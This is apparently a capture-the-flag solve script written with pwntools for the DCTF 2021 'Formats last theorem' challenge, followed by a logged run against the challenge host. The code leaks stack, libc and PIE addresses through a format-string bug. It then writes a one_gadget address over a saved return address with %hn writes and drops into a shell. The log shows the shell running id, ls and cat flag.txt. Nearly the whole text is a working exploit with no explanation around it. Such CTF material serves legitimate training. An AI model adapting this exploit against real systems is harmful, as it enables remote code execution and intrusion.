from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './formats_last_theorem'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dctf-chall-formats-last-theorem.westeurope.azurecontainer.io"
  PORT = 7482
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("It's getting kinda old at this point\n")
s.sendline("%20$p,%23$p,%22$p")

s.recvuntil("you entered\n")
r = s.recvuntil(",")[:-1]
stack_leak = int(r, 16)
r = s.recvuntil(",")[:-1]
libc_leak = int(r, 16)
libc_base = libc_leak - 0x21bf7
one_gadget = libc_base + 0x4f3d5
r = s.recvuntil("\n")[:-1]
pie_leak = int(r, 16)
pie_base = pie_leak - 0x7d0

print "stack_leak =", hex(stack_leak)
print "libc_leak  =", hex(libc_leak)
print "libc_base  =", hex(libc_base)
print "pie_leak   =", hex(pie_leak)
print "pie_base   =", hex(pie_base)

s.recvuntil("It's getting kinda old at this point\n")
index = 6
a0 = one_gadget&0xffff
a1 = (one_gadget>>16)&0xffff
a2 = (one_gadget>>32)&0xffff
a2 = ((a2-a1-1) % 0x10000) + 1
a1 = ((a1-a0-1) % 0x10000) + 1
a0 = ((a0-1) % 0x10000) + 1
buf = "%%%dc%%%d$hn" % (a0, index+5)
buf += "%%%dc%%%d$hn" % (a1, index+6)
buf += "%%%dc%%%d$hn" % (a2, index+7)
buf += "-"*(8-len(buf)%8)
buf += p64(stack_leak-0x88)
buf += p64(stack_leak-0x88+2)
buf += p64(stack_leak-0x88+4)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/DCTF_2021/Pwn_Formats_last_theorem_400$ python solve.py r
[*] '/home/mito/CTF/DCTF_2021/Pwn_Formats_last_theorem_400/formats_last_theorem'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
[+] Opening connection to dctf-chall-formats-last-theorem.westeurope.azurecontainer.io on port 7482: Done
stack_leak = 0x7ffee4bd6630
libc_leak  = 0x7f94d0eb1bf7
libc_base  = 0x7f94d0e90000
pie_leak   = 0x557b583d17d0
pie_base   = 0x557b583d1000
[*] Switching to interactive mode
you entered                                                                                              
                                                                              id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ ls
flag.txt
formats_last_theorem
startService.sh
$ cat flag.txt
dctf{N0t_all_7h30r3ms_s0und_g00d}
'''

